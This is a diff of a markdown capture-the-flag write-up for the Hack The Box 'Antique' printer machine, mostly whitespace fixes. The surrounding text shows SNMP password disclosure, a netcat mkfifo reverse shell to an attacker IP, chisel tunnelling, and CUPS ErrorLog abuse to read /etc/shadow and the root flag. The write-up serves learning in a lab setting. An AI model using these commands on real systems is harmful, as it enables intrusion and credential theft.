@@ -9,11 +9,11 @@ Running nmap scan (TCP) on the target shows the following
 ```
 PORT   STATE SERVICE VERSION
 23/tcp open  telnet?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
 |     JetDirect
 |     Password:
-|   NULL: 
+|   NULL:
 |_    JetDirect
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port23-TCP:V=7.91%I=7%D=10/7%Time=615EBCB8%P=x86_64-pc-linux-gnu%r(NULL
@@ -66,7 +66,7 @@ Shellcodes: No Results
 ```
 Let's focus on HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit) and Printer - SNMP JetAdmin Device Password Disclosure, let's mirror them both in the /exploit directory end examine them.
 
-### HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit) 
+### HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)
 Examining the [exploit blog](https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution and) seems like this exploit requires more open ports than one we have, lets check on metasploit.
 ```
 msf6 exploit(linux/misc/hp_jetdirect_path_traversal) > show options
@@ -92,7 +92,7 @@ Module options (exploit/linux/misc/hp_jetdirect_path_traversal):
 
 ```
 We do not have any open port that responds to 9100 and 8080, so we should discard using this exploit as target is not exploitable.
- 
+
 ### SNMP JetAdmin Device Password Disclosure
 this exploit requires an open SNMP port, SNMP port is running on port 161 UDP, so we can scan for UDP ports using nmap.
 ```
@@ -103,18 +103,18 @@ PORT     STATE         SERVICE VERSION
 161/udp  open          snmp    SNMPv1 server (public)
 2002/udp open|filtered globe
 ```
-SNMP port is open so we can try to exploit this.
+SNMP port is open so we can try to exploit this.  
 Let's try a SNMP walk and then query for the OID specified in the vulnerability report.
 ```
 [root@kali exploits ]$ snmpwalk -v 2c -c public $TARGET
 iso.3.6.1.2.1 = STRING: "HTB Printer"
 [root@kali exploits ]$ snmpwalk -v 2c -c public $TARGET .1.3.6.1.4.1.11.2.3.9.1.1.13.0
-iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
 ```
 BITS array represent the hex encoded password, let's try do decode it!
 ```
-[root@kali exploits ]$ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+[root@kali exploits ]$ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xxd -r -p
 P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5#          
 ```
@@ -156,7 +156,7 @@ listrawport: (No parameter required)
 
 exec: execute system commands (exec id)
 exit: quit from telnet session
-``` 
+```
 as we can se, we can run system command using exec. So we can upload a reverse shell and gain access to the system,running:
 ```
 > exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f
@@ -197,9 +197,9 @@ on the victin, launch the following command to forward the local port to the ser
 ```
 ./chisel client 10.10.14.28:8000 R:631:127.0.0.1:631
 ```
-Browsing to ``127.0.0.1:631`` on our machine shows CUPS administration page.
-CUPS versions less than 1.6.2 has a known local file read vulnerability. Navigate to Administration.
-Clicking on View Error Log shows the contents of error.log file. As CUPS server runs as root by default, arbitraty file read can be achieved by updating ErrorLog file path. Let's update the ErrorLog path usingcupsctl.
+Browsing to ``127.0.0.1:631`` on our machine shows CUPS administration page.  
+CUPS versions less than 1.6.2 has a known local file read vulnerability. Navigate to Administration.  
+Clicking on View Error Log shows the contents of error.log file. As CUPS server runs as root by default, arbitraty file read can be achieved by updating ErrorLog file path. Let's update the ErrorLog path using cupsctl.  
 ```
 cupsctl ErrorLog="/etc/shadow"
 ```
@@ -243,4 +243,3 @@ lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
 lp@antique:~$ curl http://localhost:631/admin/log/error_log
 fa21719665a3e328f0935b246e83c027
 ```
-
